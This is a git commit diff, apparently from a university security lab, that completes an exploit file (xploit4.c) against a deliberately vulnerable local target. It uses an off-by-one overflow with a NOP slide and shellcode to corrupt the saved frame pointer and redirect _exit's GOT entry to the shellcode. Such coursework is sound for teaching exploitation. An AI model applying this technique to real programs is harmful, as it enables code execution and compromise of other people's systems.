ee5b108711d0861f7df72d1f83ab9b5a53094ece
Minjian Liu <mj.liu@silabs.com>
2023-04-17 21:26:33 -0400

    Complete xploit4

--- proj1/xploits/xploit4.c
+++ proj1/xploits/xploit4.c
@@ -6,12 +6,33 @@
 #define TARGET "/tmp/target4"
 #define DEFAULT_FILE "/tmp/xploit4_output"
 
+// Get the address by using GDB
+// 0x555555555030 <_exit@plt> jmp *0x2fe2(%rip) # 0x555555558018 <_exit@got.plt>
+#define EXIT_ADDR 0x555555558010
+#define ARG_EXPLOIT_ADDR 0x7ffffffeed40
+
 int main(void)
 {
-  // TODO determine size of exploit
-  char exploit[0];
+  // Determine size of exploit
+  // As we have "int i = 0; i <= len; i++" in the target4.c,
+  // so we can add 1 more byte to overwrite the saved RBP.
+  char exploit[129];
 
-  // TODO fill exploit buffer
+  // Fill exploit buffer with NOP slide
+  // As we have NOP slide, we can just put the shellcode
+  // inside the exploit string. Then set the last byte of
+  // exploit string to another value to ruin the rbp.
+  // In this case, we change the rbp from 0x7ffffffeed20 to 0x7ffffffeed68
+  memset(exploit, '\x90', sizeof(exploit));
+  memcpy(exploit + 1, shellcode, sizeof(shellcode) - 1);
+  *(size_t *)(exploit + 128) = 0x68;
+
+  // We need to take advantage of *p = a to change the EXIT jump address
+  // 0x7ffffffeed40 + 24 = 0x7ffffffeed58, the new address of a
+  // 0x7ffffffeed40 + 32 = 0x7ffffffeed60, the new address of p
+  // We basically make exit() jump to our exploit shell code.
+  *(size_t *)(exploit + 24) = ARG_EXPLOIT_ADDR;
+  *(size_t *)(exploit + 32) = EXIT_ADDR;
 
   write_xploit(exploit, sizeof(exploit), DEFAULT_FILE);
 
